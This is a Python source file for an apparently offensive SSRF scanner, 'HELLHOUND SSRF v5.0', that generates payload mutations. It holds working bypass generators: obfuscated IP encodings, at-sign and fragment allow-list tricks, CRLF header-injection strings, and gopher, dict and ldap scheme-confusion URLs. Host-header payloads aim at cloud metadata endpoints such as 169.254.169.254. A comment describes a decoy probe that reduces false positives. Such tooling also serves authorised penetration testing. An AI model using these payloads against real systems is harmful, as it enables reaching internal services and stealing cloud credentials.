"""
HELLHOUND SSRF v5.0 - Payload Mutation Library
=================================================
v5 additions:
  [v5-NEW] CRLF injection payloads (newline_injection already existed,
           now also exposed as scheme-independent CRLF variants for
           CRLF_INJECTION context candidates)
  [v5-NEW] ldap://, ftp://, sftp://, tftp:// scheme variants for
           scheme-confusion probes (some validators only block http/https)
  [v5-NEW] Host header SSRF payload builder for HOST_HEADER context
  [v5-NEW] build_ssrf_payload() — context-aware single-call payload builder
           used by evidence_engine.py when retrying with a specific sink value
"""

from __future__ import annotations
import ipaddress
import urllib.parse


# ---------------------------------------------------------------------------
# IP representation variants
# ---------------------------------------------------------------------------

def ip_to_decimal(ip: str) -> str:
    return str(int(ipaddress.IPv4Address(ip)))


def ip_to_hex(ip: str) -> str:
    return "0x" + format(int(ipaddress.IPv4Address(ip)), "x")


def ip_to_octal(ip: str) -> str:
    return ".".join(f"0{int(p):o}" for p in ip.split("."))


def ip_to_dotted_hex(ip: str) -> str:
    return ".".join(f"0x{int(p):x}" for p in ip.split("."))


def ip_to_ipv6_mapped(ip: str) -> str:
    return f"[::ffff:{ip}]"


def ip_to_ipv6_compressed(ip: str) -> str:
    octets = [int(p) for p in ip.split(".")]
    h = f"{octets[0]:02x}{octets[1]:02x}:{octets[2]:02x}{octets[3]:02x}"
    return f"[0:0:0:0:0:ffff:{h}]"


def ip_unicode_dot(ip: str) -> str:
    return ip.replace(".", "\u3002")


def ip_to_padded_decimal(ip: str) -> str:
    """Decimal with leading zeros — some parsers strip leading zeros, some don't."""
    return str(int(ipaddress.IPv4Address(ip))).zfill(12)


IP_MUTATIONS: dict = {
    "ip_decimal":     ip_to_decimal,
    "ip_hex":         ip_to_hex,
    "ip_octal":       ip_to_octal,
    "ip_dotted_hex":  ip_to_dotted_hex,
    "ipv6_mapped":    ip_to_ipv6_mapped,
    "ipv6_compressed": ip_to_ipv6_compressed,
    "unicode_dot":    ip_unicode_dot,
    "ip_padded_decimal": ip_to_padded_decimal,
}


def apply_ip_mutation(url: str, mutation_name: str) -> str | None:
    fn = IP_MUTATIONS.get(mutation_name)
    if not fn:
        return None
    for part in url.replace("://", "/").split("/"):
        host = part.split(":")[0]
        try:
            ipaddress.IPv4Address(host)
        except ValueError:
            continue
        return url.replace(host, fn(host), 1)
    return None


# ---------------------------------------------------------------------------
# URL encoding variants
# ---------------------------------------------------------------------------

def url_encode_single(url: str) -> str:
    return urllib.parse.quote(url, safe="")


def url_encode_double(url: str) -> str:
    return urllib.parse.quote(url_encode_single(url), safe="")


def case_variation(url: str) -> str:
    scheme, _, rest = url.partition("://")
    mixed = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(scheme))
    return f"{mixed}://{rest}" if rest else url


def newline_injection(url: str) -> str:
    if "://" not in url:
        return url
    scheme, sep, rest = url.partition("://")
    host_part, _, path_part = rest.partition("/")
    return f"{scheme}{sep}{host_part}/%0d%0a{path_part}"


def comment_injection(url: str) -> str:
    return url + "/*"


def at_sign_bypass(url: str) -> str:
    """http://expected.com@127.0.0.1/ — some validators stop at the @ symbol."""
    if "://" not in url:
        return url
    scheme, _, rest = url.partition("://")
    host_and_path = rest.split("/", 1)
    host = host_and_path[0]
    path = "/" + host_and_path[1] if len(host_and_path) > 1 else "/"
    return f"{scheme}://expected.com@{host}{path}"


def fragment_bypass(url: str) -> str:
    """http://127.0.0.1#expected.com — fragment-based allow-list bypass."""
    return url.rstrip("/") + "#expected.com"


# ---------------------------------------------------------------------------
# [v5-NEW] Scheme-confusion payloads (ldap, ftp, sftp, dict)
# ---------------------------------------------------------------------------

def build_scheme_confusion_payloads(host: str, port: int = 80) -> list[str]:
    """
    Returns SSRF payloads using alternative URL schemes that some validators
    allow through because they only block http:// and https://.
    """
    return [
        f"dict://{host}:{port}/INFO",
        f"gopher://{host}:{port}/_INFO%0d%0a",
        f"ftp://{host}:{port}/",
        f"sftp://{host}:{port}/",
        f"tftp://{host}:{port}/BLKSIZE",
        f"ldap://{host}:{port}/",
        f"jar:http://{host}:{port}/!/",
        f"netdoc:http://{host}:{port}/",
    ]


# ---------------------------------------------------------------------------
# [v5-NEW] CRLF injection payload builder
# ---------------------------------------------------------------------------

def build_crlf_payloads(inject_header: str = "X-Injected", inject_value: str = "hellhound-ssrf-v5") -> list[str]:
    """
    Returns CRLF injection variants for testing header injection sinks.
    These are used by context_classifier CRLF_INJECTION candidates.
    """
    crlf_variants = [
        "\r\n",
        "%0d%0a",
        "%0D%0A",
        "%0a",
        "%0A",
        "\\r\\n",
        "%E5%98%8A%E5%98%8D",   # UTF-8 encoded CRLF (Jetty bypass)
        "%u000d%u000a",           # Unicode CRLF
    ]
    payloads = []
    for crlf in crlf_variants:
        payloads.append(f"{crlf}{inject_header}: {inject_value}")
        payloads.append(f"test{crlf}{inject_header}: {inject_value}")
        payloads.append(f"http://127.0.0.1/{crlf}{inject_header}: {inject_value}")
    return payloads


# ---------------------------------------------------------------------------
# [v5-NEW] Host header SSRF payload builder
# ---------------------------------------------------------------------------

def build_host_header_payloads(oob_host: str) -> list[str]:
    """
    Returns host values to inject into routing headers (X-Forwarded-Host etc.)
    to test for host header SSRF / cache poisoning sinks.
    """
    return [
        oob_host,
        f"a.{oob_host}",
        f"127.0.0.1",
        f"localhost",
        f"169.254.169.254",
        f"metadata.google.internal",
        f"169.254.170.2",  # ECS
        f"[::ffff:127.0.0.1]",
        f"0x7f000001",     # Hex loopback
    ]


ENCODING_MUTATIONS: dict = {
    "url_encode_single":   url_encode_single,
    "url_encode_double":   url_encode_double,
    "case_variation":      case_variation,
    "newline_injection":   newline_injection,
    "comment_injection":   comment_injection,
    "at_sign_bypass":      at_sign_bypass,
    "fragment_bypass":     fragment_bypass,
    "plain":               lambda u: u,
}


# ---------------------------------------------------------------------------
# Gopher / Dict protocol wrappers
# ---------------------------------------------------------------------------

def build_gopher_url(host: str, port: int, raw_payload: bytes) -> str:
    """Wraps a raw TCP payload in gopher:// for read-only protocol fingerprinting."""
    encoded = urllib.parse.quote(raw_payload.decode("latin1"), safe="")
    return f"gopher://{host}:{port}/_{encoded}"


def build_dict_url(host: str, port: int, command: str) -> str:
    return f"dict://{host}:{port}/{command}"


# ---------------------------------------------------------------------------
# [FIX] Shape-matched external control payload
# ---------------------------------------------------------------------------
# Root cause this exists to fix (confirmed via reproduction against a
# non-vulnerable Flask stub that echoes its url param): the differential
# detector was comparing an internal-target probe (e.g.
# "http://127.0.0.1/", ~18 chars) against a baseline established with
# candidate.original_value, which for inferred/guessed parameters is "".
# Any endpoint that reflects its input at all — logging, "received: <val>"
# echoes, form re-population, literally any app behavior that isn't
# SSRF — will show a big content-length jump purely because 18 chars of
# input showed up where 0 did before. That has nothing to do with whether
# the server made a different network decision.
#
# The fix: for every internal-target payload, also probe a same-length
# decoy that points at an RFC 5737 documentation-only address (never
# internal, never attacker infrastructure, guaranteed non-routable) and
# score it against the same baseline. If the app just echoes strings,
# the decoy inflates the response by the same amount as the real payload
# — composite_z for both will be roughly equal, and the differential
# margin check in is_suspicious() correctly stays quiet. If the app is
# actually vulnerable, fetching 127.0.0.1 and fetching a documentation-
# only unreachable address produce genuinely different status/timing/
# content — a real delta appears.

import itertools

_DOC_HOSTS = ("203.0.113.10", "198.51.100.20", "192.0.2.30")  # RFC 5737
_doc_host_cycle = itertools.cycle(_DOC_HOSTS)


def build_control_payload(payload: str) -> str:
    """
    Builds a byte-length-matched decoy of `payload` that points at a
    non-internal, non-routable RFC 5737 documentation address instead of
    the real internal/cloud target. Used to pair with internal-class
    payloads (internal_loopback, cloud_metadata, internal_rfc1918,
    generic_loopback, generic_metadata, open_redirect_internal,
    open_redirect_metadata, host_loopback, host_metadata, host_private)
    so the differential scorer can tell "response changed because the
    input got longer" apart from "response changed because the server
    actually treated this host differently".
    """
    if not payload:
        return payload
    original_len = len(payload)
    decoy_host = next(_doc_host_cycle)

    if "://" in payload:
        scheme, _, rest = payload.partition("://")
        host_part, sep, path_part = rest.partition("/")
        host_only, _, port = host_part.partition(":")
        new_host = decoy_host + (f":{port}" if port else "")
        candidate = f"{scheme}://{new_host}/{path_part}" if sep else f"{scheme}://{new_host}"
    else:
        # Bare host (host-header-style payload, no scheme/path)
        candidate = decoy_host

    return _match_length(candidate, original_len, has_scheme=("://" in payload))


def _match_length(s: str, target_len: int, has_scheme: bool) -> str:
    diff = target_len - len(s)
    if diff == 0:
        return s
    if diff > 0:
        if has_scheme:
            filler = "0" * max(diff - 1, 0)
            return (s + filler) if s.endswith("/") else (s + "/" + filler)
        return s + ("0" * diff)
    # decoy came out longer than target (rare) — trim from the path, never the host
    if has_scheme and "://" in s:
        scheme, _, rest = s.partition("://")
        host_part, sep, path_part = rest.partition("/")
        overflow = -diff
        trimmed_path = path_part[:-overflow] if overflow < len(path_part) else ""
        return f"{scheme}://{host_part}/{trimmed_path}" if sep else f"{scheme}://{host_part}"
    return s[:target_len] if target_len > 0 else s




def apply_mutation_chain(url: str, chain: list[str]) -> list[str]:
    """
    Applies each mutation in `chain` independently to `url`, returning
    the list of mutated variants to try. Each mutation is applied to the
    ORIGINAL url (not chained sequentially).
    """
    variants: list[str] = []
    for mutation in chain:
        if mutation in IP_MUTATIONS:
            mutated = apply_ip_mutation(url, mutation)
            if mutated:
                variants.append(mutated)
        elif mutation in ENCODING_MUTATIONS:
            variants.append(ENCODING_MUTATIONS[mutation](url))
    return variants


# ---------------------------------------------------------------------------
# [v5-NEW] Context-aware single-call payload builder
# ---------------------------------------------------------------------------

def build_ssrf_payload(
    target_ip: str = "127.0.0.1",
    target_port: int = 80,
    scheme: str = "http",
    path: str = "/",
    mutation: str | None = None,
) -> str:
    """
    Builds a single SSRF probe URL, optionally with a named mutation applied.
    Used by evidence_engine when retrying with a specific internal target.
    """
    url = f"{scheme}://{target_ip}:{target_port}{path}"
    if mutation:
        if mutation in IP_MUTATIONS:
            mutated = apply_ip_mutation(url, mutation)
            return mutated or url
        if mutation in ENCODING_MUTATIONS:
            return ENCODING_MUTATIONS[mutation](url)
    return url
